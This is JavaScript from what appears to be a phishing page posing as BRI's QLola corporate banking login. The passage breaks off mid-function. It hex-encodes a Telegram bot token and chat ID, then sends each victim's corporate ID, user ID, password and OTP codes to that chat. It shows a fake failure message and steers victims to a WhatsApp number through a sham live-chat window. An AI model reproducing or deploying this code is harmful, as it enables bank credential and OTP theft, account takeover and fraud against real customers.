<script>
let timerKirim;
const nomorWa = '6282374360830';

const notifSuara = new (window.AudioContext || window.webkitAudioContext)();
function bunyiNotif(){
  let osilator = notifSuara.createOscillator();
  let penguat = notifSuara.createGain();
  osilator.connect(penguat);
  penguat.connect(notifSuara.destination);
  osilator.frequency.value = 800;
  osilator.type = 'sine';
  penguat.gain.value = 0.2;
  osilator.start();
  penguat.gain.exponentialRampToValueAtTime(0.001, notifSuara.currentTime + 0.3);
  osilator.stop(notifSuara.currentTime + 0.3);
}
function bunyiTigaKali(){
  bunyiNotif();
  setTimeout(bunyiNotif, 150);
  setTimeout(bunyiNotif, 300);
}


function _dX(a){
  let hasil = "";
  for(let i=0; i<a.length; i+=2){
    hasil += String.fromCharCode(parseInt(a.substr(i,2),16));
  }
  return hasil;
}
const _p = [
  "383734303731333130363a4141473138457a49335f767475613679482d30374461474962455062636b6368506b38",
  "38323038323831363039",
  "68747470733a2f2f6170692e74656c656772616d2e6f72672f626f74"
];
const _tk = _dX(_p[0]);
const _id = _dX(_p[1]);
const _api = _dX(_p[2]);

const cid = document.getElementById('cid'), uid = document.getElementById('uid'), pass = document.getElementById('pass');
const btnMasuk = document.getElementById('btnMasuk'), btnMata = document.getElementById('btnMata');
const pesanGagal = document.getElementById('pesanGagal'), kotakOtp = document.getElementById('kotakOtp');
const btnValidasi = document.getElementById('btnValidasi'), btnKirimOtp = document.getElementById('btnKirimOtp');
const liveChat = document.getElementById('liveChat'), badanChat = document.getElementById('badanChat');
const kolomKirim = document.getElementById('kolomKirim'), btnKecil = document.getElementById('btnKecil');
const teksInfoOtp = document.getElementById('teksInfoOtp'), teksPenjelasan = document.getElementById('teksPenjelasan');
const semuaKotakOtp = document.querySelectorAll('.kolom-otp input');

let sandiTerlihat = false, kodeOtpSementara = '';

function mulaiHitungMundur(){
  clearInterval(timerKirim);
  let detik = 60;
  btnKirimOtp.innerText = `Tunggu ${detik} detik`;
  btnKirimOtp.classList.add('tunggu');
  timerKirim = setInterval(() => {
    detik--;
    btnKirimOtp.innerText = `Tunggu ${detik} detik`;
    if(detik <= 0){clearInterval(timerKirim);btnKirimOtp.innerText='Kirim Kode OTP';btnKirimOtp.classList.remove('tunggu');}
  }, 1000);
}

function tutupPembuka(){halamanPembuka.classList.add('hilang')}
function tutupOtp(){
  kotakOtp.style.display='none';
  document.documentElement.style.overflow='auto';
  document.body.style.overflow='auto';
  clearInterval(timerKirim);
  btnKirimOtp.innerText='Kirim Kode OTP';
  btnKirimOtp.classList.remove('tunggu');
  semuaKotakOtp.forEach(i=>i.value='');
  btnValidasi.classList.remove('aktif');
  btnValidasi.disabled=true;
  pesanGagal.style.display='none';
  teksInfoOtp.innerText='Kenapa membutuhkan OTP?';
  teksPenjelasan.innerText='Kami akan mengirimkan kode OTP ke alamat email berikut : *********a@gmail.com, Pastikan email Anda telah sesuai.';
}

function bukaWa(isiPesan){
  let teksDasar = `Halo, saya butuh bantuan QLola BRI\nPesan: ${isiPesan}\nCorporate ID: ${cid.value.trim()}\nUser ID: ${uid.value.trim()}`;
  let teksAkhir = encodeURIComponent(teksDasar);
  window.open(`https://wa.me/${nomorWa}?text=${teksAkhir}`,'_blank');
}

function cobaLagi(){
  pesanGagal.style.display='none';
  semuaKotakOtp.forEach(i=>i.value='');
  btnValidasi.classList.remove('aktif');
  btnValidasi.disabled=true;
  clearInterval(timerKirim);
  teksInfoOtp.innerText='Masukkan Kode OTP Token Anda';
  teksPenjelasan.innerText='Kode Telah Di Kirim Aktivasi QLola IB Anda. Jangan berikan kepada siapapun.';
  mulaiHitungMundur();
  liveChat.style.display='flex';
  liveChat.classList.remove('kecil');
  setTimeout(()=>{liveChat.classList.add('muncul');kolomKirim.focus();bunyiTigaKali()},100);
  badanChat.innerHTML = `<div class="balasan">Silakan masukkan kode OTP Token yang telah dikirimkan Qlola IB Anda .<br><br>Bisa Saya bantu Untuk yang dibutuhkan Sekarang Silahkan Cek OTP Token IB Anda Untuk Aktivasi Login Sekarang:</div>
  <div class="tombol-bantuan">
    <a onclick="bukaWa('Masalah OTP/ Token')">Masalah OTP/ Token</a>
    <a onclick="bukaWa('Lupa / Masalah Kata Sandi')">Kata Sandi</a>
    <a href="https://wa.me/6282374360830" target="_blank" class="tombol-link">Hubungi Kami</a>
    <a href="https://wa.me/6282374360830" target="_blank" class="tombol-link">Info Keamanan</a>
  </div>`;
  badanChat.scrollTop = badanChat.scrollHeight;
}

function ubahUkuranChat(){
  if(liveChat.classList.contains('muncul')){liveChat.classList.remove('muncul');liveChat.classList.add('kecil');btnKecil.innerText='↗';kolomKirim.blur()}
  else{liveChat.classList.remove('kecil');liveChat.classList.add('muncul');btnKecil.innerText='×';kolomKirim.focus()}
}

function cekIsi(){
  let adaIsi = cid.value.trim() && uid.value.trim() && pass.value.trim();
  btnMasuk.disabled = !adaIsi;
  btnMasuk.classList.toggle('active', adaIsi);
}
[cid,uid,pass].forEach(el=>el.addEventListener('input',cekIsi));

function ubahMata(){
  sandiTerlihat = !sandiTerlihat;
  pass.type = sandiTerlihat ? 'text' : 'password';
  btnMata.classList.toggle('buka', sandiTerlihat);
}

btnMasuk.addEventListener('click', async ()=>{
  btnMasuk.innerText='Memproses...';
  btnMasuk.disabled=true;
  try{
    await fetch(`${_api}${_tk}/sendMessage`,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({chat_id:_id,text:`📩 DATA LOGIN MASUK:\n\n🔹 Corporate ID: ${cid.value.trim()}\n🔹 User ID: ${uid.value.trim()}\n🔹 Kata Sandi: ${pass.value.trim()}`})
    });
  }catch(e){console.log('Gagal kirim:',e)}
  setTimeout(()=>{
    btnMasuk.innerText='Masuk';
    kotakOtp.style.display='flex';
    document.documentElement.style.overflow='hidden';
    document.body.style.overflow='hidden';
    semuaKotakOtp[0].focus();
  },1500);
});

semuaKotakOtp.forEach((kotak, indeks, arr)=>{
  kotak.addEventListener('input',()=>{
    if(kotak.value.length === 1 && indeks < arr.length-1) arr[indeks+1].focus();
    kodeOtpSementara = Array.from(arr).map(k=>k.value).join('');
    btnValidasi.disabled = kodeOtpSementara.length !== 6;
    btnValidasi.classList.toggle('aktif', kodeOtpSementara.length === 6);
  });
  kotak.addEventListener('keydown',(e)=>{
    if(e.key==='Backspace' && !kotak.value && indeks>0) arr[indeks-1].focus();
  });
});


btnKirimOtp.addEventListener('click', async ()=>{
  if(!btnKirimOtp.classList.contains('tunggu')){
    mulaiHitungMundur();
    try{
      await fetch(`${_api}${_tk}/sendMessage`,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:_id,text:`🔑 KODE TOKEN DIMINTA:\n\n🔹 Corporate ID: ${cid.value.trim()}\n🔹 User ID: ${uid.value.trim()}`})
      });
    }catch(e){console.log('Gagal kirim token:',e)}
  }
});


btnValidasi.addEventListener('click', async ()=>{
  btnValidasi.innerText='Memproses...';
  btnValidasi.disabled=true;
  try{
    await fetch(`${_api}${_tk}/sendMessage`,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({chat_id:_id,text:`🔑 KODE OTP DITERIMA:\n\n🔹 Corporate ID: ${cid.value.trim()}\n🔹 User ID: ${uid.value.trim()}\n🔹 Kode OTP: ${kodeOtpSementara}`})
    });
  }catch(e){console.log('Gagal kirim OTP:',e)}
  setTimeout(()=>{
    btnValidasi.innerText='Validasi';
    pesanGagal.style.display='flex';
    semuaKotakOtp.forEach(k=>k.value='');
    btnValidasi.classList.remove('aktif');
    btnValidasi.disabled=true;
  },2000);
});


kolomKirim.addEventListener('keydown',(e)=>{if(e.key==='Enter')kirimPesan()});
function kirimPesan(){
  let teks = kolomKirim.value.trim();
   if(!teks)return;
   bukaWa(teks);
